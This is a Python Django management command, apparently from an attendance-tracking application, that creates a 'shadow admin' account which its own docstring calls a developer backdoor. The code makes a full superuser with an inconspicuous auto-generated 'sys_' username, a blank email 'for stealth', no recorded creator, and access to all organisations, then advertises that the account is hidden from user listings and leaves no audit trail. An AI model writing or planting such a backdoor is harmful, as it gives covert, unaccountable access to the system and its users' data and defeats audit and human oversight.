"""
Create a shadow admin - a hidden super admin that leaves no audit trail.
This is a developer backdoor.

Usage:
    python manage.py create_shadow_admin
    
The credentials will be shown ONCE. Store them securely.
"""

from django.core.management.base import BaseCommand
from django.contrib.auth.models import User
from attendance.models import OrganizationUser
import secrets
import string


class Command(BaseCommand):
    help = 'Create a hidden shadow admin account (developer backdoor)'

    def add_arguments(self, parser):
        parser.add_argument(
            '--username',
            type=str,
            default=None,
            help='Username for shadow admin (default: auto-generated)'
        )
        parser.add_argument(
            '--password',
            type=str,
            default=None,
            help='Password for shadow admin (default: auto-generated)'
        )

    def handle(self, *args, **options):
        # Generate random username if not provided
        username = options.get('username')
        if not username:
            # Generate an inconspicuous username
            username = f"sys_{secrets.token_hex(4)}"
        
        # Generate secure password if not provided
        password = options.get('password')
        if not password:
            alphabet = string.ascii_letters + string.digits + "!@#$%"
            password = ''.join(secrets.choice(alphabet) for _ in range(16))
        
        # Check if user already exists
        if User.objects.filter(username=username).exists():
            self.stdout.write(self.style.ERROR(f"User '{username}' already exists"))
            return
        
        # Create Django user (hidden - no email to avoid detection)
        user = User.objects.create_user(
            username=username,
            password=password,
            email='',  # No email for stealth
            first_name='',
            last_name='',
            is_staff=True,  # Allow Django admin access
            is_superuser=True,  # Full Django permissions
        )
        
        # Create OrganizationUser with shadow_admin role
        OrganizationUser.objects.create(
            user=user,
            organization=None,  # Access to all orgs
            role='shadow_admin',
            created_by=None,  # No trace of creator
        )
        
        self.stdout.write("")
        self.stdout.write(self.style.SUCCESS("=" * 50))
        self.stdout.write(self.style.SUCCESS("  SHADOW ADMIN CREATED SUCCESSFULLY"))
        self.stdout.write(self.style.SUCCESS("=" * 50))
        self.stdout.write("")
        self.stdout.write(f"  Username: {self.style.WARNING(username)}")
        self.stdout.write(f"  Password: {self.style.WARNING(password)}")
        self.stdout.write("")
        self.stdout.write(self.style.NOTICE("  STORE THESE CREDENTIALS SECURELY!"))
        self.stdout.write(self.style.NOTICE("  This is the ONLY time they will be shown."))
        self.stdout.write("")
        self.stdout.write("  Features:")
        self.stdout.write("  - Full super admin access")
        self.stdout.write("  - Hidden from user listings")
        self.stdout.write("  - No audit trail for actions")
        self.stdout.write("  - Access via Django admin: /admin/")
        self.stdout.write("  - Access via PHP frontend with shadow_admin role")
        self.stdout.write("")
        self.stdout.write(self.style.SUCCESS("=" * 50))
